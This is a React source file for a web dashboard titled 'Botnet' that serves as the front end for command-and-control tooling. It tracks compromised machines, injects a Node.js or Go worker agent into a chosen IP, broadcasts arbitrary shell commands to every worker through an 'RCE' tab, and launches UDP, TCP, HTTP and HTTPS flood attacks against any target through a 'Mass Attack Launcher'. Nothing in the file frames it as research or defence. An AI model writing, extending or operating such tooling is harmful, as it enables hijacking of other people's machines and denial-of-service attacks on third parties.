"use client";
import { useState, useEffect, useRef } from "react";
import { motion, AnimatePresence } from "motion/react";
import { Plus, X, Loader2, Terminal, Send, Trash2, Target, Globe } from "lucide-react";
import api from "@/lib/api";
import Loader from "@/components/Loader";
import { useToast } from "@/components/ToastPopup";

interface Bot {
  id: string;
  ip: string;
  arch: string;
  cpu: number;
  username: string;
  online: boolean;
  last_seen: string;
}

interface Worker {
  id: string;
  server_id: string;
  server_ip: string;
  status: string;
  pid: number;
  last_heartbeat: string;
}

type SubTab = "servers" | "rce" | "mass";

export default function ServerManagement() {
  const [servers, setServers] = useState<Bot[]>([]);
  const [workers, setWorkers] = useState<Worker[]>([]);
  const [loading, setLoading] = useState(true);
  const [showModal, setShowModal] = useState(false);
  const [newIp, setNewIp] = useState("");
  const [newArch, setNewArch] = useState("x86_64");
  const [newCpu, setNewCpu] = useState(1);
  const [injecting, setInjecting] = useState<string | null>(null);
  const [showInjectModal, setShowInjectModal] = useState(false);
  const [injectIp, setInjectIp] = useState("");
  const [workerType, setWorkerType] = useState("node");
  const { showToast } = useToast();

  // Sub-tabs
  const [subTab, setSubTab] = useState<SubTab>("servers");

  // RCE
  const [workerId, setWorkerId] = useState("all");
  const [command, setCommand] = useState("");
  const [output, setOutput] = useState<string[]>([]);
  const [sending, setSending] = useState(false);
  const outputRef = useRef<HTMLDivElement>(null);

  // Mass attack
  const [massTarget, setMassTarget] = useState("");
  const [massMethod, setMassMethod] = useState("UDP");
  const [massPort, setMassPort] = useState("80");
  const [massTime, setMassTime] = useState(30);
  const [massWorkers, setMassWorkers] = useState(5);

  const fetchServers = async () => {
    try {
      const token = localStorage.getItem("token");
      const [s, w] = await Promise.all([
        api.get("/servers", { headers: { Authorization: `Bearer ${token}` } }),
        api.get("/workers", { headers: { Authorization: `Bearer ${token}` } }),
      ]);
      setServers(Array.isArray(s.data) ? s.data : []);
      setWorkers(Array.isArray(w.data) ? w.data : []);
    } catch (err) {
      console.error("Failed to fetch:", err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchServers();
    const timer = setInterval(fetchServers, 5000);
    return () => clearInterval(timer);
  }, []);

  const addServer = async () => {
    if (!newIp) return;
    try {
      const token = localStorage.getItem("token");
      await api.post("/add-server", { ip: newIp, arch: newArch, cpu: newCpu }, {
        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
      });
      showToast("Server added", "success");
      setShowModal(false);
      setNewIp("");
      setNewArch("x86_64");
      setNewCpu(1);
      fetchServers();
    } catch {
      showToast("Failed to add server", "error");
    }
  };

  const handleInject = async () => {
    if (!injectIp) return;
    setInjecting(injectIp);
    try {
      const token = localStorage.getItem("token");
      await api.post("/workers/inject", {
        server_id: injectIp,
        worker_type: workerType,
      }, {
        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
      });
      showToast(`Worker injected into ${injectIp}`, "success");
      setShowInjectModal(false);
      setInjectIp("");
    } catch {
      showToast("Failed to inject worker", "error");
    } finally {
      setInjecting(null);
    }
  };

  const addOutput = (line: string) => {
    setOutput((prev) => [...prev.slice(-99), `[${new Date().toLocaleTimeString()}] ${line}`]);
    setTimeout(() => outputRef.current?.scrollTo({ top: 99999, behavior: "smooth" }), 50);
  };

  const sendRCE = async () => {
    if (!command.trim()) return;
    setSending(true);
    addOutput(`> ${command} (target: ${workerId})`);
    try {
      const token = localStorage.getItem("token");
      const res = await api.post("/workers/rce", {
        worker_id: workerId,
        command: command.trim(),
        timeout: 60,
      }, {
        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
      });
      addOutput(`\u2713 Sent. CMD ID: ${res.data.cmd_id}`);
      if (res.data.target_count) addOutput(`\u2192 Targeting ${res.data.target_count} workers`);
    } catch (err: unknown) {
      const axiosErr = err as { response?: { data?: { detail?: string } }; message?: string };
      addOutput(`\u2717 Error: ${axiosErr.response?.data?.detail || axiosErr.message}`);
    } finally {
      setSending(false);
      setCommand("");
    }
  };

  const sendMassAttack = async () => {
    if (!massTarget.trim()) return;
    setSending(true);
    addOutput(`> MASS ${massMethod} ${massTarget}:${massPort} for ${massTime}s`);
    try {
      const token = localStorage.getItem("token");
      const res = await api.post("/workers/mass", {
        action: "attack",
        target: massTarget,
        method: massMethod,
        port: massPort,
        time: massTime,
        concurrents: massWorkers,
      }, {
        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
      });
      addOutput(`\u2713 Mass attack sent. Workers: ${res.data.count || "all"}`);
    } catch (err: unknown) {
      const axiosErr = err as { response?: { data?: { detail?: string } }; message?: string };
      addOutput(`\u2717 Error: ${axiosErr.response?.data?.detail || axiosErr.message}`);
    } finally {
      setSending(false);
    }
  };

  const sendMassCommand = async (cmd: string) => {
    addOutput(`> MASS EXEC: ${cmd}`);
    try {
      const token = localStorage.getItem("token");
      const res = await api.post("/workers/mass", {
        action: "exec",
        command: cmd,
      }, {
        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
      });
      addOutput(`\u2713 Sent to ${res.data.count || "all"} workers`);
    } catch (err: unknown) {
      const axiosErr = err as { response?: { data?: { detail?: string } }; message?: string };
      addOutput(`\u2717 Error: ${axiosErr.response?.data?.detail || axiosErr.message}`);
    }
  };

  const clearOutput = () => setOutput([]);

  if (loading) return <Loader variant={1} />;

  const allIps = new Set([...servers.map(s => s.ip), ...workers.map(w => w.server_ip)]);

  return (
    <div className="space-y-5">
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-sm font-medium text-white">Botnet</h2>
          <p className="text-xs text-text-muted">{allIps.size} machine{allIps.size !== 1 ? "s" : ""} in botnet</p>
        </div>
        <button
          onClick={() => setShowModal(true)}
          className="flex items-center gap-1.5 bg-primary text-background text-xs px-3 py-1.5 rounded-md hover:brightness-110 transition-all"
        >
          <Plus size={14} />
          Add Server
        </button>
      </div>

      <div className="flex gap-0.5 bg-subtle border border-border rounded-lg p-0.5 w-fit overflow-x-auto">
        {[
          { id: "servers" as SubTab, label: "Botnet", icon: Globe },
          { id: "rce" as SubTab, label: "RCE", icon: Terminal },
          { id: "mass" as SubTab, label: "Mass Attack", icon: Target },
        ].map((tab) => {
          const Icon = tab.icon;
          return (
            <button
              key={tab.id}
              onClick={() => setSubTab(tab.id)}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded-md text-xs font-medium transition-all ${
                subTab === tab.id ? "bg-primary/10 text-primary" : "text-text-muted hover:text-white"
              }`}
            >
              <Icon size={13} />
              {tab.label}
            </button>
          );
        })}
      </div>

      {subTab === "servers" && (
        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-5">
          <div className="border border-border rounded-lg overflow-x-auto">
            <table className="w-full text-xs">
              <thead>
                <tr className="border-b border-border bg-muted/50">
                  <th className="text-left px-3 py-2.5 text-text-muted font-medium uppercase tracking-wider">IP</th>
                  <th className="text-left px-3 py-2.5 text-text-muted font-medium uppercase tracking-wider">Hostname</th>
                  <th className="text-left px-3 py-2.5 text-text-muted font-medium uppercase tracking-wider">Arch</th>
                  <th className="text-left px-3 py-2.5 text-text-muted font-medium uppercase tracking-wider">CPU</th>
                  <th className="text-left px-3 py-2.5 text-text-muted font-medium uppercase tracking-wider">Online</th>
                  <th className="text-left px-3 py-2.5 text-text-muted font-medium uppercase tracking-wider">Worker</th>
                  <th className="text-left px-3 py-2.5 text-text-muted font-medium uppercase tracking-wider">PID</th>
                  <th className="text-left px-3 py-2.5 text-text-muted font-medium uppercase tracking-wider">Last Seen</th>
                  <th className="text-left px-3 py-2.5 text-text-muted font-medium uppercase tracking-wider">Actions</th>
                </tr>
              </thead>
              <tbody>
                {(() => {
                  const merged = [
                    ...servers.map((s) => {
                      const w = workers.find((x) => x.server_ip === s.ip);
                      return { ip: s.ip, hostname: s.username || "-", arch: s.arch, cpu: `${s.cpu} cores`, online: s.online, workerStatus: w ? w.status : "-", pid: w ? String(w.pid) : "-", lastSeen: s.last_seen, isBot: true, bot: s, worker: w || null };
                    }),
                    ...workers
                      .filter((w) => !servers.some((s) => s.ip === w.server_ip))
                      .map((w) => ({ ip: w.server_ip, hostname: w.server_id, arch: "-", cpu: "-", online: false, workerStatus: w.status, pid: String(w.pid), lastSeen: w.last_heartbeat, isBot: false, bot: null, worker: w })),
                  ].sort((a, b) => a.ip.localeCompare(b.ip));

                  return merged.length === 0 ? (
                    <tr>
                      <td colSpan={9} className="px-3 py-8 text-center text-text-muted">No machines in botnet</td>
                    </tr>
                  ) : (
                    merged.map((m, i) => (
                      <tr key={m.ip || i} className="border-t border-border/50 hover:bg-muted/20 transition-colors">
                        <td className="px-3 py-2.5 font-mono text-white">{m.ip}</td>
                        <td className="px-3 py-2.5 text-text-muted">{m.hostname}</td>
                        <td className="px-3 py-2.5 text-text-muted">{m.arch}</td>
                        <td className="px-3 py-2.5 text-text-muted">{m.cpu}</td>
                        <td className="px-3 py-2.5">
                          <span className={`inline-flex items-center gap-1 text-xs ${m.online ? "text-success" : "text-text-muted"}`}>
                            <span className={`w-1.5 h-1.5 rounded-full ${m.online ? "bg-success" : "bg-border"}`} />
                            {m.online ? "Online" : "Offline"}
                          </span>
                        </td>
                        <td className="px-3 py-2.5">
                          {m.worker ? (
                            <span className={`inline-flex items-center gap-1 text-xs ${m.workerStatus === "running" ? "text-success" : "text-warning"}`}>
                              <span className={`w-1.5 h-1.5 rounded-full ${m.workerStatus === "running" ? "bg-success" : "bg-warning"}`} />
                              {m.workerStatus}
                            </span>
                          ) : (
                            <span className="text-text-muted">-</span>
                          )}
                        </td>
                        <td className="px-3 py-2.5 font-mono text-text-muted">{m.pid}</td>
                        <td className="px-3 py-2.5 font-mono text-text-muted">
                          {new Date(m.lastSeen).toLocaleTimeString()}
                        </td>
                        <td className="px-3 py-2.5">
                          {!m.worker && (
                            <button
                              onClick={() => { setInjectIp(m.ip); setShowInjectModal(true); }}
                              disabled={injecting === m.ip}
                              className="flex items-center gap-1 text-primary hover:text-primary/80 transition-colors disabled:opacity-50 text-xs"
                            >
                              {injecting === m.ip ? <Loader2 size={14} className="animate-spin" /> : "Inject"}
                            </button>
                          )}
                        </td>
                      </tr>
                    ))
                  );
                })()}
              </tbody>
            </table>
          </div>

          <div className="flex flex-wrap gap-2">
            <button
              onClick={() => sendMassCommand("uptime")}
              className="text-xs bg-primary/10 border border-primary/30 rounded-md px-3 py-1.5 text-primary hover:brightness-110 transition-all"
            >
              Ping All Workers
            </button>
            <button
              onClick={() => sendMassCommand("free -m")}
              className="text-xs bg-muted/30 border border-border rounded-md px-3 py-1.5 text-text-muted hover:text-white transition-all"
            >
              Memory Usage
            </button>
            <button
              onClick={() => sendMassCommand("nproc; cat /proc/loadavg")}
              className="text-xs bg-muted/30 border border-border rounded-md px-3 py-1.5 text-text-muted hover:text-white transition-all"
            >
              CPU Load
            </button>
            <button
              onClick={() => sendMassCommand("df -h /")}
              className="text-xs bg-muted/30 border border-border rounded-md px-3 py-1.5 text-text-muted hover:text-white transition-all"
            >
              Disk Usage
            </button>
          </div>
        </motion.div>
      )}

      {subTab === "rce" && (
        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-4">
          <div className="flex items-center gap-3">
            <div className="flex-1">
              <label className="block text-xs text-text-muted mb-1">Target Worker</label>
              <select
                value={workerId}
                onChange={(e) => setWorkerId(e.target.value)}
                className="w-full bg-background border border-border rounded-md px-3 py-2 text-sm text-white focus:outline-none focus:border-primary/50"
              >
                <option value="all">ALL WORKERS (broadcast)</option>
                {workers.map((w) => (
                  <option key={w.id} value={w.id}>
                    {w.server_id} ({w.server_ip}) - {w.status}
                  </option>
                ))}
              </select>
            </div>
          </div>

          <div className="flex gap-2">
            <input
              type="text"
              value={command}
              onChange={(e) => setCommand(e.target.value)}
              onKeyDown={(e) => e.key === "Enter" && sendRCE()}
              placeholder="Enter command to execute on worker..."
              className="flex-1 bg-background border border-border rounded-md px-3 py-2 text-sm text-white placeholder-text-muted focus:outline-none focus:border-primary/50 font-mono"
            />
            <button
              onClick={sendRCE}
              disabled={sending || !command.trim()}
              className="flex items-center gap-1.5 bg-primary text-background text-xs px-4 py-2 rounded-md hover:brightness-110 transition-all disabled:opacity-50"
            >
              <Send size={13} />
              Execute
            </button>
          </div>

          <div className="border border-border rounded-lg overflow-hidden">
            <div className="flex items-center justify-between bg-muted/50 px-3 py-2 border-b border-border">
              <span className="text-xs text-text-muted font-medium uppercase tracking-wider">Output</span>
              <button onClick={clearOutput} className="text-text-muted hover:text-danger transition-colors">
                <Trash2 size={13} />
              </button>
            </div>
            <div
              ref={outputRef}
              className="bg-[#0a0e14] p-3 h-64 overflow-y-auto font-mono text-xs leading-relaxed"
            >
              {output.length === 0 ? (
                <span className="text-text-muted">No commands executed yet. Type a command above.</span>
              ) : (
                output.map((line, i) => (
                  <div
                    key={i}
                    className={`${line.includes("\u2717") ? "text-danger" : line.startsWith("[") && line.includes(">") ? "text-primary" : "text-text-muted"}`}
                  >
                    {line}
                  </div>
                ))
              )}
            </div>
          </div>
        </motion.div>
      )}

      {subTab === "mass" && (
        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-4">
          <div className="border border-border rounded-lg p-4 space-y-4">
            <h3 className="text-sm font-medium text-white">Mass Attack Launcher</h3>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
              <div>
                <label className="block text-xs text-text-muted mb-1">Target</label>
                <input
                  type="text"
                  value={massTarget}
                  onChange={(e) => setMassTarget(e.target.value)}
                  placeholder="1.2.3.4 or example.com"
                  className="w-full bg-background border border-border rounded-md px-3 py-2 text-sm text-white placeholder-text-muted focus:outline-none focus:border-primary/50"
                />
              </div>
              <div>
                <label className="block text-xs text-text-muted mb-1">Method</label>
                <select
                  value={massMethod}
                  onChange={(e) => setMassMethod(e.target.value)}
                  className="w-full bg-background border border-border rounded-md px-3 py-2 text-sm text-white focus:outline-none focus:border-primary/50"
                >
                  <option value="UDP">UDP Flood</option>
                  <option value="TCP">TCP Flood</option>
                  <option value="HTTP">HTTP Flood</option>
                  <option value="HTTPS">HTTPS Flood</option>
                </select>
              </div>
              <div>
                <label className="block text-xs text-text-muted mb-1">Port</label>
                <input
                  type="text"
                  value={massPort}
                  onChange={(e) => setMassPort(e.target.value)}
                  placeholder="80"
                  className="w-full bg-background border border-border rounded-md px-3 py-2 text-sm text-white placeholder-text-muted focus:outline-none focus:border-primary/50"
                />
              </div>
              <div>
                <label className="block text-xs text-text-muted mb-1">Duration (s)</label>
                <input
                  type="number"
                  value={massTime}
                  onChange={(e) => setMassTime(Number(e.target.value))}
                  min={1}
                  className="w-full bg-background border border-border rounded-md px-3 py-2 text-sm text-white focus:outline-none focus:border-primary/50"
                />
              </div>
            </div>
            <button
              onClick={sendMassAttack}
              disabled={sending || !massTarget}
              className="flex items-center gap-2 bg-danger text-white text-sm font-medium px-4 py-2 rounded-md hover:brightness-110 transition-all disabled:opacity-50"
            >
              <Target size={14} />
              {sending ? "Launching..." : `Launch Mass ${massMethod} Attack`}
            </button>
          </div>

          <div className="border border-border rounded-lg p-4 space-y-3">
            <h3 className="text-sm font-medium text-white">Quick Mass Commands</h3>
            <div className="flex flex-wrap gap-2">
              {[
                { label: "uptime", cmd: "uptime" },
                { label: "whoami", cmd: "whoami" },
                { label: "free -m", cmd: "free -m" },
                { label: "df -h", cmd: "df -h" },
                { label: "ps aux", cmd: "ps aux | head -20" },
                { label: "netstat", cmd: "netstat -tlnp" },
                { label: "ip addr", cmd: "ip addr" },
                { label: "Uname -a", cmd: "uname -a" },
              ].map((b) => (
                <button
                  key={b.label}
                  onClick={() => sendMassCommand(b.cmd)}
                  className="text-xs bg-muted/30 border border-border rounded-md px-3 py-1.5 text-text-muted hover:text-white hover:border-primary/50 transition-all"
                >
                  {b.label}
                </button>
              ))}
            </div>
          </div>

          <div ref={outputRef} className="bg-[#0a0e14] border border-border rounded-lg p-3 h-48 overflow-y-auto font-mono text-xs leading-relaxed">
            {output.length === 0 ? (
              <span className="text-text-muted">Output will appear here...</span>
            ) : (
              output.slice(-20).map((line, i) => (
                <div
                  key={i}
                  className={`${line.includes("\u2717") ? "text-danger" : line.startsWith("[") && line.includes(">") ? "text-primary" : "text-text-muted"}`}
                >
                  {line}
                </div>
              ))
            )}
          </div>
        </motion.div>
      )}

      <AnimatePresence>
        {showModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/60 flex items-center justify-center z-50"
            onClick={() => setShowModal(false)}
          >
            <motion.div
              initial={{ scale: 0.95, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
              className="bg-[#161b22] border border-[#30363d] rounded-lg p-5 w-full max-w-md space-y-4"
              onClick={(e) => e.stopPropagation()}
            >
              <div className="flex items-center justify-between">
                <h3 className="text-sm font-medium text-white">Add Server</h3>
                <button onClick={() => setShowModal(false)} className="text-text-muted hover:text-white transition-colors">
                  <X size={16} />
                </button>
              </div>
              <div className="space-y-3">
                <div>
                  <label className="block text-xs text-text-muted mb-1">IP Address</label>
                  <input
                    type="text"
                    value={newIp}
                    onChange={(e) => setNewIp(e.target.value)}
                    placeholder="0.0.0.0"
                    className="w-full bg-[#0d1117] border border-[#30363d] rounded-md px-3 py-2 text-sm text-white placeholder-text-muted focus:outline-none focus:border-[#e6edf3]/50"
                  />
                </div>
                <div>
                  <label className="block text-xs text-text-muted mb-1">Architecture</label>
                  <select
                    value={newArch}
                    onChange={(e) => setNewArch(e.target.value)}
                    className="w-full bg-[#0d1117] border border-[#30363d] rounded-md px-3 py-2 text-sm text-white focus:outline-none focus:border-[#e6edf3]/50"
                  >
                    <option value="x86_64">x86_64</option>
                    <option value="aarch64">aarch64</option>
                    <option value="i686">i686</option>
                  </select>
                </div>
                <div>
                  <label className="block text-xs text-text-muted mb-1">CPU Cores</label>
                  <input
                    type="number"
                    value={newCpu}
                    onChange={(e) => setNewCpu(Number(e.target.value))}
                    min={1}
                    className="w-full bg-[#0d1117] border border-[#30363d] rounded-md px-3 py-2 text-sm text-white focus:outline-none focus:border-[#e6edf3]/50"
                  />
                </div>
              </div>
              <div className="flex justify-end gap-2">
                <button
                  onClick={() => setShowModal(false)}
                  className="px-3 py-1.5 text-xs text-text-muted hover:text-white transition-colors"
                >
                  Cancel
                </button>
                <button
                  onClick={addServer}
                  disabled={!newIp}
                  className="bg-primary text-background text-xs px-4 py-1.5 rounded-md hover:brightness-110 transition-all disabled:opacity-50"
                >
                  Add
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      <AnimatePresence>
        {showInjectModal && injectIp && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/60 flex items-center justify-center z-50"
            onClick={() => setShowInjectModal(false)}
          >
            <motion.div
              initial={{ scale: 0.95, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
              className="bg-[#161b22] border border-[#30363d] rounded-lg p-5 w-full max-w-md space-y-4"
              onClick={(e) => e.stopPropagation()}
            >
              <div className="flex items-center justify-between">
                <h3 className="text-sm font-medium text-white">Inject Worker</h3>
                <button onClick={() => setShowInjectModal(false)} className="text-text-muted hover:text-white transition-colors">
                  <X size={16} />
                </button>
              </div>
              <p className="text-xs text-text-muted">
                Inject worker agent into <span className="text-white">{injectIp}</span>
              </p>
              <div>
                <label className="block text-xs text-text-muted mb-1">Worker Type</label>
                <select
                  value={workerType}
                  onChange={(e) => setWorkerType(e.target.value)}
                  className="w-full bg-[#0d1117] border border-[#30363d] rounded-md px-3 py-2 text-sm text-white focus:outline-none focus:border-[#e6edf3]/50"
                >
                  <option value="node">Node.js (npm module)</option>
                  <option value="binary">Go binary</option>
                </select>
              </div>
              <div className="flex justify-end gap-2">
                <button
                  onClick={() => setShowInjectModal(false)}
                  className="px-3 py-1.5 text-xs text-text-muted hover:text-white transition-colors"
                >
                  Cancel
                </button>
                <button
                  onClick={handleInject}
                  disabled={injecting !== null}
                  className="flex items-center gap-1.5 bg-primary text-background text-xs px-4 py-1.5 rounded-md hover:brightness-110 transition-all disabled:opacity-50"
                >
                  {injecting ? <Loader2 size={12} className="animate-spin" /> : null}
                  {injecting ? "Injecting..." : "Inject"}
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
